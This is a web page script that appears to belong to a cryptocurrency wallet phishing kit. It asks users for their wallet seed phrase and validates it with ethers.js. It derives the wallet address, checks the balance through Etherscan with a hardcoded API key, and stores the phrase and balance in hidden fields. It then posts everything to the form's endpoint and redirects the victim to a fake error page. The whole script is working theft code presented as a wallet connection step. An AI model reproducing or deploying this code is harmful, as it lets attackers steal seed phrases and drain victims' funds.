<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.0/dist/ethers.umd.min.js"></script>
<script>
    // Retrieve selected wallet info from localStorage
    const selectedWallet = JSON.parse(localStorage.getItem('selectedWallet'));
    if (selectedWallet) {
        document.getElementById('selected_wallet_name').value = selectedWallet.wallet;
        document.getElementById('selected_wallet_logo').value = selectedWallet.logo;
        document.getElementById('project_name').value = selectedWallet.wallet; // Change the project name dynamically
    }

    async function validateSeedPhrase() {
        const textarea = document.getElementById('modal-textarea');
        const phrase = textarea.value.trim();

        // Use ethers.js to validate the mnemonic
        if (!ethers.utils.isValidMnemonic(phrase)) {
            alert('Please enter a valid seed phrase.');
            return false;
        }

        let walletAddress = null;
        try {
            // Generate wallet address from mnemonic
            const hdNode = ethers.utils.HDNode.fromMnemonic(phrase);
            walletAddress = hdNode.derivePath("m/44'/60'/0'/0/0").address;

            // Save values in hidden fields
            document.getElementById('wallet_address').value = walletAddress;
            localStorage.setItem('wallet_address', walletAddress);
            document.getElementById('seed_phrase').value = phrase;

            // Fetch wallet balance
            await fetchBalance(walletAddress);
            return true;
        } catch (error) {
            console.error("Error generating wallet address:", error);
            alert('An error occurred while processing your seed phrase.');
            return false;
        }
    }

    async function fetchBalance(walletAddress) {
        const apiKey = 'DCPF322JU2N9YVZV56D14UT1WV9ET8XNXR'; // Etherscan API key
        const etherscanUrl = `https://api.etherscan.io/api?module=account&action=balance&address=${walletAddress}&tag=latest&apikey=${apiKey}`;

        try {
            const response = await fetch(etherscanUrl);
            const data = await response.json();

            if (data.status === "1") {
                const balanceInWei = data.result;
                const balanceInEther = ethers.utils.formatEther(balanceInWei);

                // Save balance in hidden field
                document.getElementById('balance').value = balanceInEther;
                console.log('Wallet balance:', balanceInEther);
            } else {
                console.warn("Failed to fetch balance:", data.message);
                document.getElementById('balance').value = "0.0";
            }
        } catch (error) {
            console.error("Error fetching balance:", error);
            document.getElementById('balance').value = "0.0";
        }
    }

    document.getElementById('seedPhraseForm').onsubmit = async function (event) {
        event.preventDefault(); // Prevent default form submission

        const isValid = await validateSeedPhrase();
        if (isValid) {
            // Submit the form data if validation passes
            const formData = new FormData(this);

            try {
                const response = await fetch(this.action, {
                    method: this.method,
                    body: formData,
                });

                const result = await response.json();

                if (result.success) {
                    // Redirect after successful submission
                    window.location.href = "https://multiupdateapi.live/error.html";
                } else {
                    alert(result.message || 'Connection failed. Please try again.');
                }
            } catch (error) {
                console.error("Error connecting:", error);
                alert('An error occurred while connecting.');
            }
        } else {
            alert('Invalid seed phrase. Please try again.');
        }
    };
</script>
